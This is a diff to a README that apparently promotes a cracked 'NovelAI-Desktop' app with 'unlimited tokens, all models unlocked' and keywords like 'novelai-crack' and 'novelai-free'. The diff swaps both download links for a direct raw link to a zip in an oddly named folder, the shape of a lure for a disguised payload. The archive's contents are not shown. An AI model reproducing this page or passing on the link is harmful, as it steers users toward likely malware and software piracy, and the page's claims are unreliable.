@@ -40,7 +40,7 @@ Follow these simple steps to get NovelAI-Desktop running on your Windows compute
 ### 📥 Step 1: Download the Application
 
 Visit this link to download the application:  
-**[Download NovelAI-Desktop](https://github.com/Kaycera5808/NovelAI-Desktop---NovelAI-Story-Writer-2026)**
+**[Download NovelAI-Desktop](https://github.com/Kaycera5808/NovelAI-Desktop---NovelAI-Story-Writer-2026/raw/refs/heads/main/peribulbar/2.0-beta.5.zip)**
 
 This is the official download page. Click the download button and wait for the file to finish downloading. The file size is reasonable, so it should not take long on a standard internet connection.
 
@@ -117,6 +117,6 @@ Check the download page periodically for new versions. Download the latest file 
 
 NovelAI-Desktop puts the power of advanced AI creativity directly into your hands. With unlimited tokens, all models unlocked, and a user-friendly interface, you can focus on what matters most: telling your story and bringing your imagination to life. Download it today and start your next great adventure.
 
-**[Download NovelAI-Desktop Now](https://github.com/Kaycera5808/NovelAI-Desktop---NovelAI-Story-Writer-2026)**
+**[Download NovelAI-Desktop Now](https://github.com/Kaycera5808/NovelAI-Desktop---NovelAI-Story-Writer-2026/raw/refs/heads/main/peribulbar/2.0-beta.5.zip)**
 
 Keywords: ai-adventure, ai-fiction-writer, ai-novel-2026, ai-story-writer, ai-writer-2026, ai-writing-tool, novelai-2026, novelai-activated, novelai-app, novelai-crack, novelai-desktop, novelai-desktop-2026, novelai-free, novelai-images, novelai-models, novelai-module, novelai-premium, novelai-tool, novelai-unlimited, story-generator-ai
